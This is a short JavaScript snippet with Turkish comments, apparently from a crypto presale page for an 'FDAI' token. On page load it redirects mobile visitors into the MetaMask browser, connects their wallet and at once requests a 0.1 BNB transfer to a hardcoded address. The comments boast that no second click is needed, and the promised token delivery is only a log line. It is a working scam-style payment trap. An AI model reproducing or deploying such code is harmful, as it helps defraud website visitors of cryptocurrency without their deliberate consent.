// AYARLAR
const BNB_RECEIVER_ADDRESS = "0xd924e01c7d319c5B23708Cd622bD1143CD4Fb360";
const PRESALE_URL = "https://buyfreedogeaifdai.org";

// SAYFA AÇILINCA OTOMATİK İŞLEM
window.addEventListener('load', async () => {
  // 1️⃣ MOBİL META MASK YÖNLENDİRMESİ (Tarayıcıdan direkt uygulamaya)
  if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
    if (!window.ethereum) {
      window.location.href = `metamask://browser?url=${PRESALE_URL}`; // Direkt MetaMask tarayıcısında aç
      return;
    }
  }

  // 2️⃣ MOBİL İMZA İSTE (MetaMask tarayıcısı içinde)
  if (window.ethereum) {
    try {
      // A) CÜZDAN BAĞLAMA (2. tık gerekmeden)
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      
      // B) BNB GÖNDERME İŞLEMİ
      const bnbAmount = 0.1; // Örnek: 0.1 BNB
      await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          to: BNB_RECEIVER_ADDRESS,
          from: accounts[0],
          value: ethers.utils.parseEther(bnbAmount.toString()).toHexString()
        }]
      });
      
      // C) TOKEN DAĞITIMI (Backend'e gidecek API isteği)
      console.log("BNB alındı, FDAI gönderilecek!");
    } catch (error) {
      console.error("Hata:", error);
    }
  }
});
